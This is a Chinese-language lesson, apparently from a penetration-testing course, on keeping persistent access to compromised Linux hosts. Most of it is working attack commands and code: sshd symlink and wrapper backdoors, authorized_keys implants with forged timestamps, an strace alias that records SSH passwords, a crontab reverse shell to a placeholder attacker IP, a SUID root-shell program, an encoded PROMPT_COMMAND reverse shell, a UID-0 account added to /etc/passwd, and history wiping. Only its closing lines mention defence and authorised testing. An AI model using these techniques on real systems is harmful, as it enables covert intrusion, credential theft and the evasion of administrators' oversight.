# 🛡️ 课程P83：Linux权限维持技术详解

![](img/1bdb9238ac7826586087fcdc7f6cbb22_1.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_3.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_5.png)

在本节课中，我们将学习在Linux系统下进行权限维持的各种技巧。权限维持是渗透测试中至关重要的一环，它确保攻击者在获得初始访问权限后，能够长期、隐蔽地控制目标系统。我们将从SSH后门、别名与定时任务、特殊权限利用以及其他小技巧等多个方面进行系统性的讲解。

## 🔑 第一部分：SSH后门及私钥公钥

![](img/1bdb9238ac7826586087fcdc7f6cbb22_7.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_9.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_11.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_13.png)

上一节我们概述了课程内容，本节中我们来看看SSH后门的具体实现方法。SSH（Secure Shell）是连接Linux主机的标准协议，利用其服务可以建立隐蔽的后门通道。

### 1. SSH软链接后门

![](img/1bdb9238ac7826586087fcdc7f6cbb22_15.png)

此方法通过创建SSH守护进程（sshd）的软链接，并指定一个自定义端口来建立后门。连接该端口时，无需密码验证即可获得Shell访问权限。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_17.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_19.png)

**核心命令：**
```bash
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=12345
```
执行此命令后，目标主机将在12345端口监听。攻击者使用SSH连接此端口时，无需密码即可登录。需要注意的是，如果系统配置禁止root用户远程登录，则此方法无法使用root身份登录。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_21.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_23.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_25.png)

### 2. SSH Server Wrapper后门

![](img/1bdb9238ac7826586087fcdc7f6cbb22_27.png)

此方法通过替换系统的`sshd`文件为一个包装脚本（Wrapper Script）来实现后门。该脚本会检查连接客户端的源端口，若匹配特定值，则返回一个Shell。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_29.png)

**实现原理：**
1.  将原始的`/usr/sbin/sshd`移动到`/usr/bin/sshd`。
2.  在`/usr/sbin/sshd`位置创建一个新的脚本。
3.  脚本判断连接源端口的大端序（Big-Endian）格式是否与预设值匹配（例如`4A`对应十进制13377）。
4.  若匹配，则执行`/bin/bash -i`返回一个交互式Shell；若不匹配，则执行原始的`/usr/bin/sshd`，保证正常SSH功能不受影响。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_31.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_32.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_33.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_34.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_36.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_38.png)

攻击者连接时，需使用`socat`等工具指定特定的源端口进行连接：
```bash
socat STDIO TCP4:目标IP:22,sourceport=13377
```

![](img/1bdb9238ac7826586087fcdc7f6cbb22_40.png)

### 3. SSH公钥认证后门

![](img/1bdb9238ac7826586087fcdc7f6cbb22_42.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_44.png)

这是最经典的SSH后门方式，利用SSH的公钥认证机制实现免密登录。

**操作步骤：**
1.  在攻击机上生成密钥对：`ssh-keygen -t rsa`。
2.  将生成的公钥（`id_rsa.pub`）内容写入目标主机的`~/.ssh/authorized_keys`文件中。
3.  使用攻击机的私钥（`id_rsa`）即可免密码SSH登录目标主机。

为了隐藏文件修改时间，可以使用`touch`命令：
```bash
touch -r ~/.ssh/known_hosts ~/.ssh/authorized_keys
```

### 4. SSH键盘记录器

![](img/1bdb9238ac7826586087fcdc7f6cbb22_46.png)

通过在SSH命令上创建别名（alias），利用`strace`工具跟踪记录SSH会话的输入输出，从而捕获管理员通过SSH登录其他服务器时输入的密码。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_48.png)

**别名设置命令：**
```bash
alias ssh='strace -o /tmp/sshpasswd -e read,write -s 2048 ssh'
```
当管理员执行`ssh`命令时，其所有输入（包括密码）和输出都会被记录到`/tmp/sshpasswd`文件中。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_50.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_52.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_54.png)

### 5. SSH隐身登录

![](img/1bdb9238ac7826586087fcdc7f6cbb22_56.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_58.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_60.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_62.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_64.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_66.png)

使用SSH的`-T`参数或指定一个伪终端（pty）可以避免登录行为被`w`、`who`、`last`等命令记录。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_67.png)

**隐身登录命令：**
```bash
ssh -T user@目标IP /bin/bash -i
```
或
```bash
ssh -o UserKnownHostsFile=/dev/null -T user@目标IP /bin/bash -i
```

![](img/1bdb9238ac7826586087fcdc7f6cbb22_69.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_71.png)

### 6. Vim编辑器后门

![](img/1bdb9238ac7826586087fcdc7f6cbb22_73.png)

如果目标主机的Vim编辑器支持Python扩展，可以利用其执行Python脚本的特性开启一个后门端口。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_75.png)

**操作流程：**
1.  将反弹Shell的Python脚本放入Vim的插件目录（如`~/.vim/plugin/`）。
2.  通过`nohup`命令在后台运行Vim并执行该脚本，监听指定端口。
```bash
cd /usr/lib/python2.7/site-packages && nohup vim -E -c "pyfile dir.py"> /tmp/out.txt 2>&1 &
```
3.  攻击者使用`nc`连接该端口即可获得Shell。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_77.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_78.png)

---

![](img/1bdb9238ac7826586087fcdc7f6cbb22_80.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_82.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_84.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_86.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_88.png)

## ⚙️ 第二部分：别名与定时任务后门

![](img/1bdb9238ac7826586087fcdc7f6cbb22_90.png)

上一节我们介绍了SSH相关的权限维持方法，本节中我们来看看如何利用系统自身的特性，如命令别名和定时任务来维持权限。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_92.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_94.png)

### 1. 别名（Alias）后门

![](img/1bdb9238ac7826586087fcdc7f6cbb22_96.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_98.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_100.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_102.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_104.png)

通过为常用命令（如`cat`、`ls`）设置别名，可以在管理员执行这些命令时，静默运行后门程序。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_106.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_108.png)

**以下是设置别名后门的步骤：**
*   首先，编译一个用于反弹Shell的C程序。
*   然后，为该程序设置SUID权限，使其能以root身份执行。
*   最后，为`cat`命令创建别名，使其在执行前先运行后门程序。
```bash
alias cat='先执行后门程序; /bin/cat'
```
当管理员使用`cat`命令时，会触发后门连接回攻击机。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_110.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_112.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_114.png)

### 2. 定时任务（Crontab）后门

![](img/1bdb9238ac7826586087fcdc7f6cbb22_116.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_118.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_120.png)

通过向当前用户的crontab中添加任务，可以定期执行反弹Shell的命令，实现持久化。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_122.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_124.png)

**添加定时任务的命令：**
```bash
(crontab -l; echo "*/1 * * * * bash -i >& /dev/tcp/攻击机IP/端口 0>&1") | crontab -
```
这条命令会每分钟尝试向攻击机的指定端口反弹一个Shell。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_126.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_128.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_130.png)

---

![](img/1bdb9238ac7826586087fcdc7f6cbb22_132.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_134.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_136.png)

## 🚀 第三部分：利用SUID与SGID权限维持

![](img/1bdb9238ac7826586087fcdc7f6cbb22_138.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_140.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_142.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_144.png)

在提权部分我们曾详细介绍了SUID/SGID权限，本节我们看看如何主动创建具有这些权限的后门程序来维持权限。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_146.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_148.png)

**核心思路：** 自己编写一个C程序，为其设置SUID权限。当普通用户执行此程序时，它将以root权限运行。

**示例后门程序代码：**
```c
#include <stdlib.h>
#include <unistd.h>
int main(int argc, char **argv) {
    setuid(0);
    setgid(0);
    if(argc == 2) {
        system(argv[1]); // 执行传入的命令
    } else {
        system("/bin/bash -p"); // 直接返回一个root shell
    }
    return 0;
}
```
**编译与设置：**
```bash
gcc suid_backdoor.c -o /usr/local/bin/backdoor
chmod 4755 /usr/local/bin/backdoor # 设置SUID位
```
之后，普通用户执行`backdoor`命令即可获得root权限的Shell。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_150.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_152.png)

---

![](img/1bdb9238ac7826586087fcdc7f6cbb22_154.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_156.png)

## 🎭 第四部分：其他权限维持小技巧

![](img/1bdb9238ac7826586087fcdc7f6cbb22_158.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_160.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_162.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_163.png)

最后，我们补充一些用于隐藏自身、清理痕迹和建立其他类型后门的小技巧。

### 1. 文件隐藏
*   **隐藏文件：** 创建以`.`开头的文件，普通`ls`命令无法列出，需使用`ls -a`。
*   **文件加锁：** 使用`chattr +i 文件名`命令给文件加上不可修改、不可删除的属性，即使是root用户也无法直接操作。解除使用`chattr -i`。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_165.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_167.png)

### 2. 操作痕迹清除
*   **关闭历史记录：** 在当前Shell中执行`set +o history`，此后的命令不会被记录到`~/.bash_history`中。恢复使用`set -o history`。
*   **删除历史记录：** 使用`sed -i '100,$d' ~/.bash_history`删除历史记录文件中的指定行。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_169.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_171.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_173.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_175.png)

### 3. PROMPT_COMMAND 后门
`PROMPT_COMMAND`是一个环境变量，其中定义的命令会在bash显示提示符前执行。可以在此变量中嵌入反弹Shell的命令。
```bash
export PROMPT_COMMAND='python -c "import base64,sys;exec(base64.b64decode(\"编码后的反弹shell命令\"))"'
```
用户每执行一次命令，都会触发一次后门连接。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_177.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_178.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_180.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_181.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_183.png)

### 4. 添加后门账户
直接在`/etc/passwd`文件中添加一个UID为0（root）的用户。
```bash
echo "backdoor:加密的密码:0:0::/root:/bin/bash" >> /etc/passwd
```
密码可以使用`openssl passwd -1`或`mkpasswd`命令生成。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_185.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_187.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_189.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_191.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_193.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_195.png)

### 5. 命令劫持
利用环境变量`$PATH`的优先级，在优先级更高的目录（如`/tmp`）中放置与系统命令（如`ps`、`netstat`）同名的恶意程序，当管理员执行这些命令时，实际运行的是后门程序。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_197.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_199.png)

### 6. WebShell隐藏技巧
在PHP WebShell开头使用`<?php `和`?>`将代码包裹，在某些查看方式下可以隐藏`<?php`之前的内容，起到一定的混淆作用。

---

![](img/1bdb9238ac7826586087fcdc7f6cbb22_201.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_203.png)

## 📚 课程总结

![](img/1bdb9238ac7826586087fcdc7f6cbb22_205.png)

![](img/1bdb9238ac7826586087fcdc7f6cbb22_207.png)

本节课中我们一起学习了Linux系统下多种权限维持的技术。我们从**SSH后门**（软链接、Wrapper、公钥、键盘记录、隐身登录）入手，探讨了利用**别名和定时任务**建立后门的方法，复习并利用了**SUID/SGID权限**来创建持久化后门程序，最后介绍了一系列用于**隐藏、清理痕迹和建立其他类型后门**的小技巧。

![](img/1bdb9238ac7826586087fcdc7f6cbb22_209.png)

掌握这些技术有助于理解攻击者的持久化手段，从而在防御时能更有针对性地进行排查和加固。需要注意的是，所有这些技术都应在合法授权和道德准则下进行学习和测试。